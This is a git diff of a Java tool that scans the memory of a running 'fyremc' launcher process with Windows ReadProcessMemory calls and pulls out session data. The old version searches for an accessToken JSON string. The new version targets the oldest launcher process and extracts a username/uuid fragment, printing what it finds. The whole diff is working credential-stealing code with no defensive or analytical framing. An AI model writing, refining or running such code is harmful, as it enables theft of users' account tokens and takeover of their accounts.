@@ -5,35 +5,35 @@ import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMAT
 import jdk.incubator.foreign.*;
 
 import java.nio.charset.StandardCharsets;
+import java.util.Comparator;
+import java.util.Optional;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class Main {
-    private static final int CHUNK_SIZE = 32;
-    private static final int JSON_BUFFER_SIZE = 512;
+    private static final int CHUNK_SIZE = 128;
+    private static final int JSON_BUFFER_SIZE = 256;
 
     public static void main(String[] args) {
         System.out.println("Porog a fornettigyar");
         ExecutorService executor = Executors.newFixedThreadPool(8);
 
-        ProcessHandle.allProcesses()
-                .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
-                .forEach(proc -> {
-                    executor.execute(() -> {
-                        String res = tryFindAccessToken(proc.pid());
-                        if (!res.isEmpty()) {
-                            System.out.println("[!] Found something in " + proc.pid() + " (P): " + res.split("\0")[0]);
-                        }
-                    });
+        Optional<ProcessHandle> process = ProcessHandle.allProcesses()
+            .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
+            .min(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()));
 
-                    proc.children().forEach(child -> executor.execute(() -> {
-                        String res = tryFindAccessToken(child.pid());
-                        if (!res.isEmpty()) {
-                            System.out.println("[!] Found something in " + proc.pid() + ": " + res.split("\0")[0]);
-                        }
-                    }));
-                });
+        if (process.isEmpty()) {
+            System.out.println("[!] The launcher has not started.");
+            return;
+        }
 
+        ProcessHandle proc = process.get();
+        executor.execute(() -> {
+            String res = tryFindAccessToken(proc.pid());
+            if (!res.isEmpty()) {
+                System.out.println("[!] Found something in " + proc.pid() + " (P): " + res.split("\0")[0]);
+            }
+        });
         executor.shutdown();
     }
 
@@ -61,16 +61,20 @@ public class Main {
                             if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                 String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
 
-                                if (bufferString.contains("{\"access")) {
+                                if (bufferString.contains("\",\"uuid\":\"")) {
                                     buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, JSON_BUFFER_SIZE);
 
                                     if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, JSON_BUFFER_SIZE, MemoryAddress.NULL) != 0) {
                                         bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
 
-                                        int idx = bufferString.indexOf("{\"accessToken\":\"");
-                                        if (idx != -1) {
-                                            return bufferString.substring(idx, bufferString.length() - idx);
-                                        }
+                                        int endIdx = bufferString.indexOf(",\"stats");
+                                        int startIdx = bufferString.indexOf("me\":\"");
+
+                                        if (endIdx == -1) endIdx = bufferString.indexOf(",\"skins");
+
+                                        if (startIdx == -1 || endIdx == -1) continue;
+
+                                        return "\"userna"+bufferString.substring(startIdx, endIdx);
                                     }
                                 }
                             }
